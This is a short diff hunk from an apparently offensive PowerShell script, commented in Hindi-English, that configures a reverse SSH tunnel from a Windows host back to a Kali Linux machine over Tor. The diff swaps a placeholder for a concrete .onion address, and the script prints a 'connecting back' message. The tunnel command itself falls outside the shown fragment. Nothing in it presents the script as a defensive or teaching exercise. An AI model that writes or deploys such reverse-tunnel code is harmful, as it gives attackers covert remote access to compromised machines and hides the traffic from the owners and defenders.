@@ -49,7 +49,7 @@ Start-Sleep -Seconds 10
 # 7. Setup Reverse SSH Tunnel to Kali .onion address
 # Yahan apna Kali ka user aur .onion address dalein
 $KaliUser = "kali"
-$KaliOnion = "YOUR_KALI_ONION_ADDRESS.onion"
+$KaliOnion = "vyueljfv6xim5baiz7t2dkcntsssbtneamcanm6zvn4imlwcollfyeid.onion"
 
 Write-Host "[+] Connecting back to Kali Linux via Tor..." -ForegroundColor Green
 # Plink ya native ssh command ka use karke reverse tunnel establish karein
